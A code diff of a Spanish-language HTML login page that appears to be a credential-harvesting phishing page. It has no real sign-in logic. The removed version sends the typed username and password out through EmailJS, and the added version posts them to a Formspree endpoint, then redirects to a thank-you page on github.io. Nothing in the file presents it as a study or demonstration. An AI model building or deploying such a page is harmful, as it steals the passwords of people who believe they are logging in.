@@ -1,45 +1,62 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
-  <script>
-    (function(){
-      emailjs.init("d8q3sBWEctV-MobNA"); // Tu Public Key
-    })();
-
-    function enviarCorreo(event) {
-      event.preventDefault(); // Evita que el formulario recargue la página
-
-      const usuario = document.getElementById("usuario").value;
-      const contrasena = document.getElementById("contrasena").value;
-
-      emailjs.send("service_htfde5y", "template_5l95084", {
-        usuario: usuario,
-        contrasena: contrasena
-      })
-      .then(function(response) {
-        console.log("Correo enviado con éxito", response.status, response.text);
-        // Redirige al completar envío
-        window.location.href = "gracias.html";
-      }, function(error) {
-        console.error("Error al enviar el correo", error);
-        alert("Hubo un error al enviar los datos.");
-      });
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-  </script>
+    form {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 300px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #2d89ef;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1b6cd4;
+    }
+  </style>
 </head>
 <body>
-  <h2>Iniciar Sesión</h2>
-  <form onsubmit="enviarCorreo(event)">
-    <label for="usuario">Usuario:</label><br>
-    <input type="text" id="usuario" name="usuario" required><br><br>
 
-    <label for="contrasena">Contraseña:</label><br>
-    <input type="password" id="contrasena" name="contrasena" required><br><br>
+  <form action="https://formspree.io/f/xanjybdv" method="POST">
+    <h2>Iniciar Sesión</h2>
+    <input type="text" name="usuario" placeholder="Usuario" required>
+    <input type="password" name="contrasena" placeholder="Contraseña" required>
+
+    <!-- Redirección automática después del envío -->
+    <input type="hidden" name="_next" value="https://arkraineet.github.io/gracias.html">
 
     <button type="submit">Entrar</button>
   </form>
+
 </body>
 </html>
